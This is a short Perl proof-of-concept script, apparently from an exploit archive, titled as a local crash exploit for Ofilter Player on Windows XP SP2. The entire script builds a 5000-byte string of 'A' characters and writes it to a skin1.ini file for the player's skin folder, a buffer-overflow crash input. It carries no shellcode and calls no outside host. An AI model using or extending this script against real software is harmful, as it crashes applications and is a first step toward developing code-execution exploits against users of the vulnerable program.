#!/usr/bin/perl
#Exploit Title: Ofilter Player (skin.ini) Local Crash PoC
#Author:Vulnerability Discovered By Rehan Ahmed (rehan@rewterz.com)
#Tested On: WinXP SP2

my $boom="\x41" x 5000;
my $file="skin1.ini"; #C:\Program Files\OfilterPlayer\skin
open($FILE,">$file");
print $FILE $boom;
close($FILE);
print "File Successfully Created\n";


